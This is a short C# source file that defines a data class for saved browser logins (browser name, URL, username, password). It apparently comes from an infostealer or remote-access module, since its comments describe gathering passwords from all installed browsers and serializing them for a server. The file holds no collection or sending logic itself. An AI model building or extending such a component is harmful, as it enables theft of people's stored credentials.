using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Module_Browser_Info.Response
{
    /// <summary>
    /// node for get browser saved logins info from all browser used on Module_Browser_Info main class and serialized for server
    /// </summary>
    public class OnGetAllBrowserPasswordsResponse
    {
        /// <summary>
        /// The list of saved logins data
        /// </summary>
        public List<SavedLogins> savedlogins = new List<SavedLogins>();
        /// <summary>
        /// class is involved the saved login data and target browser
        /// </summary>
        public class SavedLogins
        {
            public string TargetBrowserName;
            public string Url;
            public string UserName;
            public string Password;
        }
        /// <summary>
        /// The errors if happened
        /// </summary>
        public Utils._s_Utils_ErrosHandling Errors = new Utils._s_Utils_ErrosHandling();
    }
}
